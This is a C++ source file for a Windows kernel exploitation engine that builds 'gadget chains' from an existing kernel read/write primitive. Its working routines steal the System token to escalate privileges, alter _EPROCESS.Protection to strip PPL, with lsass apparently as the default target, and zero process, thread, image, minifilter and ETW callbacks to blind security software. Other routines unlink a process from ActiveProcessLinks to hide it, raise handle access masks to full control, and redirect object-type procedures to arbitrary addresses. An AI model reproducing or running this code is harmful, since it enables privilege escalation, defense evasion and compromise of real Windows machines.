#include "GadgetChaining.h"
#include "SymbolResolver.hpp"
#include <algorithm>
#include <cctype>
#include <sstream>
#include <iostream>
#include <Windows.h>
#include <Psapi.h>

#pragma comment(lib, "Psapi.lib")

// Local helper for readable gadget type names
static std::string GadgetTypeName(GadgetType type) {
    switch (type) {
    case GadgetType::TOKEN_FIELD: return "TOKEN_FIELD";
    case GadgetType::TOKEN_PRIVILEGES: return "TOKEN_PRIVILEGES";
    case GadgetType::HANDLE_TABLE_ENTRY_ACCESS: return "HANDLE_ACCESS";
    case GadgetType::PROCESS_CALLBACK: return "PROCESS_CALLBACK";
    case GadgetType::THREAD_CALLBACK: return "THREAD_CALLBACK";
    case GadgetType::IMAGE_CALLBACK: return "IMAGE_CALLBACK";
    case GadgetType::MINIFILTER_CALLBACK: return "MINIFILTER_CALLBACK";
    case GadgetType::ETW_CALLBACK: return "ETW_CALLBACK";
    case GadgetType::OBJECT_TYPE_OPEN: return "OBJECT_OPEN";
    case GadgetType::OBJECT_TYPE_CLOSE: return "OBJECT_CLOSE";
    case GadgetType::OBJECT_TYPE_DELETE: return "OBJECT_DELETE";
    case GadgetType::OBJECT_TYPE_SECURITY: return "OBJECT_SECURITY";
    case GadgetType::GENERIC_FUNCTION_POINTER: return "FUNC_POINTER";
    case GadgetType::GENERIC_ACCESS_MASK: return "ACCESS_MASK";
    case GadgetType::GENERIC_FLAG_FIELD: return "FLAG_FIELD";
    case GadgetType::TIMER_DPC: return "TIMER_DPC";
    case GadgetType::DPC_ROUTINE: return "DPC_ROUTINE";
    case GadgetType::APC_KERNEL_ROUTINE: return "APC_KERNEL";
    case GadgetType::WORK_ITEM_ROUTINE: return "WORK_ITEM";
    case GadgetType::DRIVER_MAJOR_FUNCTION: return "DRIVER_MAJOR";
    default: return "UNKNOWN";
    }
}

GadgetChainingEngine::GadgetChainingEngine(KernelReadWrite* readWrite)
    : rw(readWrite) {
    OffsetManager mgr;
    offsets = mgr.GetCurrentOffsets();
}

void GadgetChainingEngine::SetAvailableGadgets(const std::map<uint64_t, DataGadget>& gadgets) {
    available_gadgets = gadgets;
    BuildDependencyGraph();
}

GadgetChain GadgetChainingEngine::FindPrivilegeEscalationChain(uint32_t targetPid) {
    auto chain = BuildTokenStealChain(targetPid);
    chain.goal = ExploitGoal::PRIVILEGE_ESCALATION;
    chain.goal_name = "privilege escalation";
    if (chain.description.empty())
        chain.description = "Overwrite token with System token";
    return chain;
}

GadgetChain GadgetChainingEngine::FindPPLBypassChain(uint32_t targetPid, uint8_t newProt) {
    GadgetChain chain{};
    chain.goal = ExploitGoal::BYPASS_PPL;
    chain.goal_name = "ppl bypass";

    if (targetPid == 0) {
        for (auto& kv : available_gadgets) {
            const auto& g = kv.second;
            if (g.type == GadgetType::PROCESS_FLAGS && g.type_name == "PROCESS_PROTECTION" &&
                g.is_writable) {
                std::string ownerLower = g.owner_process;
                std::transform(ownerLower.begin(), ownerLower.end(), ownerLower.begin(), ::tolower);
                if (ownerLower.find("lsass") != std::string::npos && g.process_id != 0) {
                    targetPid = static_cast<uint32_t>(g.process_id);
                    break;
                }
            }
        }
    }
    if (targetPid == 0) targetPid = GetCurrentProcessId();

    for (auto& kv : available_gadgets) {
        auto& g = kv.second;
        if (g.type == GadgetType::PROCESS_FLAGS && g.type_name == "PROCESS_PROTECTION" &&
            g.process_id == targetPid && g.is_writable) {
            chain.gadget_addresses = {g.address};
            chain.original_values[g.address] = g.original_value;
            chain.new_values[g.address] = newProt;
            std::stringstream ss;
            ss << "Set _EPROCESS.Protection for process [" << targetPid;
            if (!g.owner_process.empty()) ss << " " << g.owner_process;
            ss << "] to 0x" << std::hex << static_cast<int>(newProt)
               << " (orig=0x" << g.original_value << std::dec << ")";
            chain.description = ss.str();
            return chain;
        }
    }

    chain.description = "No writable _EPROCESS.Protection for requested process";
    return chain;
}

GadgetChain GadgetChainingEngine::FindDisableSecurityChain() {
    auto chain = BuildCallbackRedirectChain();
    chain.goal = ExploitGoal::DISABLE_SECURITY;
    chain.goal_name = "disable security";
    if (!chain.IsValid()) chain.description = "No writable security callbacks found";
    return chain;
}

GadgetChain GadgetChainingEngine::FindArbitraryReadChain(uint64_t targetAddr, size_t size) {
    GadgetChain chain{};
    chain.goal = ExploitGoal::ARBITRARY_READ;
    chain.goal_name = "arbitrary read";

    if (targetAddr && size) {
        chain.gadget_addresses = {targetAddr};
        chain.dependencies.push_back({targetAddr, size});
        std::stringstream ss;
        ss << "Read " << size << " bytes from 0x" << std::hex << targetAddr << std::dec;
        chain.description = ss.str();
        return chain;
    }

    chain = BuildHandleElevationChain();
    if (chain.IsValid()) {
        chain.goal = ExploitGoal::ARBITRARY_READ;
        chain.goal_name = "arbitrary read";
        chain.description = "Handle table access-based read primitive";
        return chain;
    }
    chain.description = "No viable read primitive found";
    return chain;
}

GadgetChain GadgetChainingEngine::FindArbitraryWriteChain(uint64_t targetAddr, uint64_t value) {
    GadgetChain chain{};
    chain.goal = ExploitGoal::ARBITRARY_WRITE;
    chain.goal_name = "arbitrary write";

    if (targetAddr) {
        chain.gadget_addresses = {targetAddr};
        chain.new_values[targetAddr] = value;
        std::stringstream ss;
        ss << "Write 0x" << std::hex << value << " to 0x" << targetAddr << std::dec;
        chain.description = ss.str();
        return chain;
    }

    chain = BuildHandleElevationChain();
    if (chain.IsValid()) {
        chain.goal = ExploitGoal::ARBITRARY_WRITE;
        chain.goal_name = "arbitrary write";
        chain.description = "Handle table access-based write primitive";
        return chain;
    }
    chain.description = "No viable write primitive found";
    return chain;
}

GadgetChain GadgetChainingEngine::FindCodeRedirectChain(uint64_t targetOverride) {
    GadgetChain chain{};
    chain.goal = ExploitGoal::CODE_EXECUTION_REDIRECT;
    chain.goal_name = "code redirection";

    const GadgetType targets[] = {
        GadgetType::OBJECT_TYPE_OPEN,
        GadgetType::OBJECT_TYPE_CLOSE,
        GadgetType::OBJECT_TYPE_DELETE,
        GadgetType::OBJECT_TYPE_PARSE,
        GadgetType::OBJECT_TYPE_SECURITY,
        GadgetType::OBJECT_TYPE_QUERYNAME
    };

    uint64_t target = targetOverride;
    if (!target) {
        if (const char* env = std::getenv("DOG_REDIRECT_TARGET")) {
            target = _strtoui64(env, nullptr, 0);
        }
    }

    for (auto t : targets) {
        for (auto& kv : available_gadgets) {
            auto& g = kv.second;
            if (g.type == t && g.is_writable) {
                chain.gadget_addresses = {g.address};
                chain.original_values[g.address] = g.original_value;
                if (target) {
                    chain.new_values[g.address] = target;
                    std::stringstream ss;
                    ss << "Redirect object type procedure to 0x" << std::hex << target;
                    chain.description = ss.str();
                } else {
                    chain.description = "Set DOG_REDIRECT_TARGET=0x<addr> or pass target to write new value";
                }
                return chain;
            }
        }
    }

    chain.description = "No writable object type procedure found";
    return chain;
}

GadgetChain GadgetChainingEngine::FindTokenStealingChain(uint32_t targetPid) {
    return BuildTokenStealChain(targetPid);
}

GadgetChain GadgetChainingEngine::FindCallbackDisableChain() { return GadgetChain{}; }

GadgetChain GadgetChainingEngine::FindUnlinkProcessChain(uint32_t targetPid) {
    GadgetChain chain{};
    chain.goal = ExploitGoal::UNLINK_PROCESS;
    chain.goal_name = "unlink process";

    if (targetPid == 0) {
        for (auto& kv : available_gadgets) {
            auto& g = kv.second;
            if (g.type == GadgetType::TOKEN_FIELD && g.process_id != 0) {
                targetPid = static_cast<uint32_t>(g.process_id);
                break;
            }
        }
    }
    if (targetPid == 0) return chain;

    uint64_t eproc = 0;
    for (auto& kv : available_gadgets) {
        auto& g = kv.second;
        if (g.type == GadgetType::TOKEN_FIELD && g.process_id == targetPid) {
            eproc = g.structure_base;
            break;
        }
    }
    if (!eproc || offsets.eprocess_active_process_links == 0) return chain;

    uint64_t links = eproc + offsets.eprocess_active_process_links;
    uint64_t flink = rw->ReadPointer(links);
    uint64_t blink = rw->ReadPointer(links + 8);
    if (!flink || !blink) return chain;

    chain.gadget_addresses = {blink, flink, links};
    chain.original_values[blink] = rw->ReadPointer(blink);
    chain.original_values[flink + 8] = rw->ReadPointer(flink + 8);
    chain.original_values[links] = flink;
    chain.original_values[links + 8] = blink;

    chain.new_values[blink] = flink;
    chain.new_values[flink + 8] = blink;
    chain.new_values[links] = links;
    chain.new_values[links + 8] = links;

    std::stringstream ss;
    ss << "Unlink PID " << targetPid << " from ActiveProcessLinks";
    chain.description = ss.str();
    return chain;
}

GadgetChain GadgetChainingEngine::FindChainForGoal(ExploitGoal goal) {
    switch (goal) {
    case ExploitGoal::PRIVILEGE_ESCALATION: return FindPrivilegeEscalationChain(0);
    case ExploitGoal::BYPASS_PPL: return FindPPLBypassChain(0, 0);
    case ExploitGoal::DISABLE_SECURITY: return FindDisableSecurityChain();
    case ExploitGoal::ARBITRARY_READ: return FindArbitraryReadChain();
    case ExploitGoal::ARBITRARY_WRITE: return FindArbitraryWriteChain();
    case ExploitGoal::CODE_EXECUTION_REDIRECT: return FindCodeRedirectChain();
    case ExploitGoal::PERSISTENCE: return GadgetChain{};
    case ExploitGoal::UNLINK_PROCESS: return FindUnlinkProcessChain(0);
    case ExploitGoal::TOKEN_STEALING: return FindTokenStealingChain(0);
    case ExploitGoal::CALLBACK_DISABLE: return GadgetChain{};
    default: return GadgetChain{};
    }
}

bool GadgetChainingEngine::ExecuteChain(const GadgetChain& chain) {
    bool ok = true;
    for (auto& kv : chain.new_values) {
        ok &= rw->Write<uint64_t>(kv.first, kv.second);
    }
    return ok;
}

bool GadgetChainingEngine::RestoreChain(const GadgetChain& chain) {
    bool ok = true;
    for (auto& kv : chain.original_values) {
        ok &= rw->Write<uint64_t>(kv.first, kv.second);
    }
    return ok;
}

std::vector<GadgetChain> GadgetChainingEngine::FindAllPossibleChains() {
    std::vector<GadgetChain> chains;
    chains.push_back(FindPrivilegeEscalationChain());
    chains.push_back(FindPPLBypassChain());
    chains.push_back(FindDisableSecurityChain());
    chains.push_back(FindArbitraryReadChain());
    chains.push_back(FindArbitraryWriteChain());
    chains.push_back(FindCodeRedirectChain());
    chains.push_back(FindUnlinkProcessChain(0));
    return chains;
}

GadgetChain GadgetChainingEngine::FindOptimalChain(ExploitGoal goal) {
    return FindChainForGoal(goal);
}

bool GadgetChainingEngine::VerifyTokenMatchesSystem(uint32_t pid, uint64_t& targetTok, uint64_t& systemTok) {
    targetTok = 0;
    systemTok = 0;

    uint64_t targetField = 0;
    for (auto& kv : available_gadgets) {
        auto& g = kv.second;
        if (g.type == GadgetType::TOKEN_FIELD && g.process_id == pid) {
            targetField = g.address;
            break;
        }
    }
    if (!targetField) return false;
    targetTok = rw->ReadPointer(targetField) & ~0xFULL;

    {
        LPVOID drivers[1024] = {};
        DWORD needed = 0;
        uint64_t nt_base = 0;
        if (EnumDeviceDrivers(drivers, sizeof(drivers), &needed) && needed >= sizeof(LPVOID)) {
            nt_base = reinterpret_cast<uint64_t>(drivers[0]);
        }
        auto rva_psinit = symres::ResolveNtoskrnlSymbolRva("PsInitialSystemProcess");
        if (nt_base && rva_psinit) {
            uint64_t eproc = rw->ReadPointer(nt_base + *rva_psinit);
            if (eproc) {
                uint64_t tok = rw->ReadPointer(eproc + offsets.eprocess_token);
                systemTok = tok & ~0xFULL;
            }
        }
    }
    if (!systemTok) {
        for (auto& kv : available_gadgets) {
            auto& g = kv.second;
            if (g.type == GadgetType::TOKEN_FIELD && g.process_id == 4) {
                systemTok = rw->ReadPointer(g.address) & ~0xFULL;
                break;
            }
        }
    }
    if (!systemTok) return false;
    return targetTok == systemTok;
}

std::string GadgetChainingEngine::ChainToString(const GadgetChain& chain) const {
    std::stringstream ss;
    ss << chain.goal_name << ": ";
    if (!chain.IsValid()) {
        ss << "not available";
    } else {
        ss << chain.description << " gadgets=" << chain.gadget_addresses.size();
    }
    return ss.str();
}

void GadgetChainingEngine::PrintChain(const GadgetChain& chain) const {
    std::cout << ChainToString(chain) << std::endl;
    const size_t limit = 5;
    size_t shown = 0;
    for (auto addr : chain.gadget_addresses) {
        if (shown >= limit) break;
        auto it = available_gadgets.find(addr);
        std::string label;
        if (it != available_gadgets.end()) {
            const auto& g = it->second;
            if (!g.name.empty()) {
                label = g.name;
            } else {
                label = GadgetTypeName(g.type);
                if (g.process_id) {
                    label += " pid=" + std::to_string(g.process_id);
                }
                if (!g.owner_process.empty()) {
                    label += " owner=" + g.owner_process;
                }
            }
        }
        std::cout << "  - " << (label.empty() ? "" : label + " @ ") << "0x" << std::hex << addr << std::dec << std::endl;
        shown++;
    }
    if (chain.gadget_addresses.size() > limit) {
        std::cout << "  ... (+" << (chain.gadget_addresses.size() - limit) << " more)" << std::endl;
    }
}

void GadgetChainingEngine::BuildDependencyGraph() {
    graph.clear();
    for (auto& kv : available_gadgets) {
        GadgetNode node{};
        node.address = kv.first;
        node.executed = false;
        graph[node.address] = node;
    }
}

std::vector<uint64_t> GadgetChainingEngine::TopologicalSort(const std::vector<uint64_t>& gadgets) {
    return gadgets;
}

GadgetChain GadgetChainingEngine::BuildTokenStealChain(uint32_t targetPid) {
    GadgetChain chain{};
    chain.goal = ExploitGoal::TOKEN_STEALING;
    chain.goal_name = "token stealing";

    DWORD selfPid = targetPid ? targetPid : GetCurrentProcessId();
    char selfNameBuf[MAX_PATH] = {0};
    GetModuleFileNameA(nullptr, selfNameBuf, MAX_PATH);
    std::string selfName(selfNameBuf);
    auto lastSlash = selfName.find_last_of("\\/");
    if (lastSlash != std::string::npos) selfName = selfName.substr(lastSlash + 1);
    auto toLower = [](std::string s) {
        std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c){ return (char)std::tolower(c); });
        return s;
    };
    std::string selfNameLower = toLower(selfName);
    uint64_t sysTokenAddr = 0, sysTokenVal = 0;
    uint64_t selfTokenAddr = 0, selfTokenVal = 0;
    uint64_t sysTokenRaw = 0, selfTokenRaw = 0;
    uint32_t sysPid = 0, selfFoundPid = 0;

    {
        LPVOID drivers[1024] = {};
        DWORD needed = 0;
        uint64_t nt_base = 0;
        if (EnumDeviceDrivers(drivers, sizeof(drivers), &needed) && needed >= sizeof(LPVOID)) {
            nt_base = reinterpret_cast<uint64_t>(drivers[0]);
        }
        auto rva_psinit = symres::ResolveNtoskrnlSymbolRva("PsInitialSystemProcess");
        if (nt_base && rva_psinit) {
            uint64_t eproc = rw->ReadPointer(nt_base + *rva_psinit);
            if (eproc) {
                uint64_t tok = rw->ReadPointer(eproc + offsets.eprocess_token);
                tok &= ~0xFULL;
                if (tok) {
                    sysTokenVal = tok;
                    sysPid = 4;
                }
            }
        }
    }

    for (auto& kv : available_gadgets) {
        auto& g = kv.second;
        if (g.type != GadgetType::TOKEN_FIELD) continue;
        std::string ownerLower = toLower(g.owner_process);
        bool isSystemOwner = ownerLower.find("system") != std::string::npos;
        if (g.process_id == 4) {
            sysTokenAddr = g.address;
            sysTokenVal = g.original_value;
            sysTokenRaw = rw->ReadPointer(g.address);
            sysPid = g.process_id;
        } else if (sysPid != 4 && !sysTokenAddr && isSystemOwner) {
            sysTokenAddr = g.address;
            sysTokenVal = g.original_value;
            sysTokenRaw = rw->ReadPointer(g.address);
            sysPid = (uint32_t)g.process_id;
        } else if (g.process_id == selfPid) {
            selfTokenAddr = g.address;
            selfTokenVal = g.original_value;
            selfTokenRaw = rw->ReadPointer(g.address);
            selfFoundPid = (uint32_t)g.process_id;
        }
    }

    if ((sysTokenAddr || sysTokenVal) && selfTokenAddr) {
        uint64_t newTokenVal = sysTokenVal ? sysTokenVal : (sysTokenRaw & ~0xFULL);

        chain.gadget_addresses = {selfTokenAddr};
        chain.new_values[selfTokenAddr] = newTokenVal;
        chain.original_values[selfTokenAddr] = selfTokenRaw ? selfTokenRaw : selfTokenVal;
        std::stringstream ss;
        ss << "Token steal: write System(pid " << (sysPid ? sysPid : 4) << ") token into self(pid " << selfFoundPid << ")";
        chain.description = ss.str();
    }
    return chain;
}

GadgetChain GadgetChainingEngine::BuildCallbackRedirectChain() {
    GadgetChain chain{};
    for (auto& kv : available_gadgets) {
        const auto& g = kv.second;
        if (!g.is_writable) continue;
        switch (g.type) {
        case GadgetType::PROCESS_CALLBACK:
        case GadgetType::THREAD_CALLBACK:
        case GadgetType::IMAGE_CALLBACK:
        case GadgetType::MINIFILTER_CALLBACK:
        case GadgetType::ETW_CALLBACK:
        case GadgetType::BUGCHECK_CALLBACK:
        case GadgetType::SHUTDOWN_CALLBACK:
            chain.gadget_addresses.push_back(g.address);
            chain.original_values[g.address] = g.original_value;
            chain.new_values[g.address] = 0;
            break;
        default:
            break;
        }
    }
    if (!chain.gadget_addresses.empty()) {
        chain.description = "Disable " + std::to_string(chain.gadget_addresses.size()) + " security callbacks";
    }
    return chain;
}

GadgetChain GadgetChainingEngine::BuildHandleElevationChain() {
    GadgetChain chain{};
    chain.goal = ExploitGoal::ARBITRARY_WRITE;
    chain.goal_name = "arbitrary write";

    for (auto& kv : available_gadgets) {
        auto& g = kv.second;
        if (g.type == GadgetType::HANDLE_TABLE_ENTRY_ACCESS && g.is_writable) {
            chain.gadget_addresses.push_back(g.address);
            chain.original_values[g.address] = g.original_value;
            chain.new_values[g.address] = 0xFFFFFFFF;
            chain.description = "Elevate handle access mask to full control";
            return chain;
        }
    }
    return chain;
}

std::vector<uint64_t> GadgetChainingEngine::FindGadgetsByType(GadgetType type) const {
    std::vector<uint64_t> result;
    for (auto& kv : available_gadgets) {
        if (kv.second.type == type) result.push_back(kv.first);
    }
    return result;
}

std::vector<uint64_t> GadgetChainingEngine::FindGadgetsByPattern(const std::string& pattern) const {
    std::vector<uint64_t> result;
    for (auto& kv : available_gadgets) {
        if (kv.second.name.find(pattern) != std::string::npos) result.push_back(kv.first);
    }
    return result;
}

uint64_t GadgetChainingEngine::FindCurrentProcessToken() const {
    DWORD selfPid = GetCurrentProcessId();
    for (auto& kv : available_gadgets) {
        auto& g = kv.second;
        if (g.type == GadgetType::TOKEN_FIELD && g.process_id == selfPid) {
            return g.original_value;
        }
    }
    return 0;
}

uint64_t GadgetChainingEngine::FindSystemProcessToken() const {
    for (auto& kv : available_gadgets) {
        auto& g = kv.second;
        if (g.type == GadgetType::TOKEN_FIELD && (g.process_id == 4 || g.owner_process == "System")) {
            return g.original_value;
        }
    }
    return 0;
}

uint64_t GadgetChainingEngine::FindSymbolAddress(const std::string&) const { return 0; }
bool GadgetChainingEngine::IsPPLProcess(uint64_t) const { return false; }
bool GadgetChainingEngine::IsSecurityCallback(uint64_t) const { return false; }
